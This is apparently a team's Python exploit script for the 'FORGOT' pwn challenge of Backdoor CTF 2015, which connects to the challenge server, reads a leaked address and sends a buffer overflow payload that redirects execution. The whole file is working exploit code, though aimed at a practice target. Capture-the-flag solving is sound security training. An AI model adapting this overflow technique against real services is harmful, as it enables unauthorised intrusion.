#!/usr/bin/python
#
# Backdoor CTF 2015
# FORGOT (PWN/200)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

from pwn import *
from struct import pack, unpack
import re

offset = 0x78 # offset from end_with_dot to 0x080486CC

host = 'hack.bckdr.in'
h = remote(host, 8009, timeout = None)
print h.recvuntil('> ')

name = "420"
h.send(name + "\n")

msg = h.recvuntil('> ')
print msg

# Get end_with_dot address
m = re.findall("Here:\s(.*?)$", msg, re.MULTILINE)

# Calculate target address
end_with_dot_Addr = int(m[0], 16)
targetAddr = end_with_dot_Addr + offset

# Send exploit buffer
valstr = "A" * 32 + pack('<I', targetAddr)
h.send(valstr + "\n")

print h.recvall()
h.close()